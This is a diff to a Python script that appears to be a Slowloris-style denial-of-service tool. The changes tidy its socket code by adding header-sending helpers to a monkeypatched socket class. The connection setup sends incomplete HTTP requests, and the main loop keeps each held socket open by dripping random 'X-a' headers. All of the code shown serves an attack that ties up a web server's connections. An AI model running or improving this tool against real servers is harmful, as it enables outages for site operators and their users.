@@ -124,20 +124,35 @@ user_agents = [
 ]
 
 
+class _(socket.socket):
+    def send_line(self, line):
+        line = f"{line}\r\n"
+        self.send(line.encode("utf-8"))
+
+    def send_header(self, name, value):
+        self.send_line(f"{name}: {value}")
+
+
+socket.socket = _
+
+
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
+
     if args.https:
         s = ssl.wrap_socket(s)
 
     s.connect((ip, args.port))
 
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+
+    ua = user_agents[0]
     if args.randuseragent:
-        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
-    else:
-        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
-    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+        ua = random.choice(user_agents)
+
+    s.send_header("User-Agent", ua)
+    s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
 
 
@@ -163,9 +178,7 @@ def main():
             )
             for s in list(list_of_sockets):
                 try:
-                    s.send(
-                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
-                    )
+                    s.send_header("X-a", random.randint(1, 5000))
                 except socket.error:
                     list_of_sockets.remove(s)
 
